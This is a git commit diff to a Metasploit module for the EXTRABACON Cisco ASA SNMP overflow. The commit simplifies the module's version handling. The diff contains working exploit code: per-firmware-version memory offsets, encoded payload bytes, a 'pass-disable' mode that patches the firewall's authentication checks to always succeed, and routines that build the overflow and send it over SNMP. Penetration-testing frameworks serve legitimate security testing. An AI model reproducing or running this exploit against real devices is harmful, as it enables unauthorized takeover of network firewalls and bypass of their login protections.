b77adc97f0af5024a165e1431bc2511ae2db9cf7
TheNaterz <nate.caroe@risksense.com>
2016-09-22 15:05:42 -0600

    Removing redundant version check

--- modules/auxiliary/admin/cisco/cisco_asa_extrabacon.rb
+++ modules/auxiliary/admin/cisco/cisco_asa_extrabacon.rb
@@ -49,9 +49,9 @@ class MetasploitModule < Msf::Auxiliary
                    "64.90.8.8",        # admauth_offset, 7
                    "85.137.229.87"],   # admauth_code,   8
 
+      "9.2(2)8" => ["21.187.10.8", "54.245.39.9", "72", "0.240.183.9", "16.252.183.9", "85.49.192.137", "0.80.8.8", "64.90.8.8", "16.252.183.9"],
       "8.4(3)" => ["13.178.7.8", "150.219.224.8", "72", "0.192.84.9", "208.207.84.9", "85.49.192.137", "0.16.8.8", "208.23.8.8", "85.137.229.87"],
-      "8.2(3)" => ["45.0.7.8", "252.42.185.8", "88", "0.96.43.9", "128.111.43.9", "85.49.192.137", "0.240.6.8", "144.241.6.8", "85.137.229.87"],
-      "9.2(2)8" => ["21.187.10.8", "54.245.39.9", "72", "0.240.183.9", "16.252.183.9", "85.49.192.137", "0.80.8.8", "64.90.8.8", "16.252.183.9"]
+      "8.2(3)" => ["45.0.7.8", "252.42.185.8", "88", "0.96.43.9", "128.111.43.9", "85.49.192.137", "0.240.6.8", "144.241.6.8", "85.137.229.87"]
     }
 
   end
@@ -62,11 +62,6 @@ class MetasploitModule < Msf::Auxiliary
 
   def cleanup
     # Cleanup is called once for every single thread
-  end
-
-  def fw_version_check(vers_string)
-    version = vers_string.split(" ").last
-    return version
   end
 
   def check
@@ -80,44 +75,42 @@ class MetasploitModule < Msf::Auxiliary
       return Exploit::CheckCode::Unknown
     end
 
-    asa_vers = fw_version_check(vers_string)
-
-    if @offsets[asa_vers]
-      print_status("Payload for Cisco ASA version #{asa_vers} available")
+    if @offsets[vers_string]
+      print_status("Payload for Cisco ASA version #{vers_string} available")
       return Exploit::CheckCode::Appears
     end
 
-    print_warning("Received Cisco ASA version #{asa_vers}, but no payload available")
+    print_warning("Received Cisco ASA version #{vers_string}, but no payload available")
     return Exploit::CheckCode::Detected
   end
 
-  def build_offsets(asa_vers, mode)
+  def build_offsets(vers_string, mode)
       if mode == 'pass-disable'
           always_return_true = "49.192.64.195"
           pmcheck_bytes = always_return_true
           admauth_bytes = always_return_true
       else
-          pmcheck_bytes = @offsets[asa_vers][5]
-          admauth_bytes = @offsets[asa_vers][8]
+          pmcheck_bytes = @offsets[vers_string][5]
+          admauth_bytes = @offsets[vers_string][8]
       end
 
       preamble_snmp = ""
       preamble_snmp += "49.219.49.246.49.201.49.192.96.49.210.128.197.16.128.194.7.4.125.80.187."
-      preamble_snmp += @offsets[asa_vers][3]
+      preamble_snmp += @offsets[vers_string][3]
       preamble_snmp += ".205.128.88.187."
-      preamble_snmp += @offsets[asa_vers][6]
+      preamble_snmp += @offsets[vers_string][6]
       preamble_snmp += ".205.128.199.5."
-      preamble_snmp += @offsets[asa_vers][4]
+      preamble_snmp += @offsets[vers_string][4]
       preamble_snmp += "."
       preamble_snmp += pmcheck_bytes
       preamble_snmp += ".199.5."
-      preamble_snmp += @offsets[asa_vers][7]
+      preamble_snmp += @offsets[vers_string][7]
       preamble_snmp += "."
       preamble_snmp += admauth_bytes
       preamble_snmp += ".97.104."
-      preamble_snmp += @offsets[asa_vers][1]
+      preamble_snmp += @offsets[vers_string][1]
       preamble_snmp += ".128.195.16.191.11.15.15.15.137.229.131.197."
-      preamble_snmp += @offsets[asa_vers][2]
+      preamble_snmp += @offsets[vers_string][2]
       preamble_snmp += ".195"
 
       wrapper = preamble_snmp
@@ -131,7 +124,7 @@ class MetasploitModule < Msf::Auxiliary
       head += "9.95"
       finder_snmp = "139.124.36.20.139.7.255.224.144"
 
-      overflow = [head, wrapper, @offsets[asa_vers][0], finder_snmp].join(".")
+      overflow = [head, wrapper, @offsets[vers_string][0], finder_snmp].join(".")
       return overflow
   end
 
@@ -146,11 +139,10 @@ class MetasploitModule < Msf::Auxiliary
       snmp = connect_snmp
 
       vers_string = snmp.get_value('1.3.6.1.2.1.47.1.1.1.1.10.1').to_s
-      asa_vers = fw_version_check(vers_string)
 
       print_status("Building payload for #{mode}...")
 
-      overflow = build_offsets(asa_vers, mode)
+      overflow = build_offsets(vers_string, mode)
       payload = SNMP::ObjectId.new(overflow)
 
       print_status("Sending SNMP payload...")
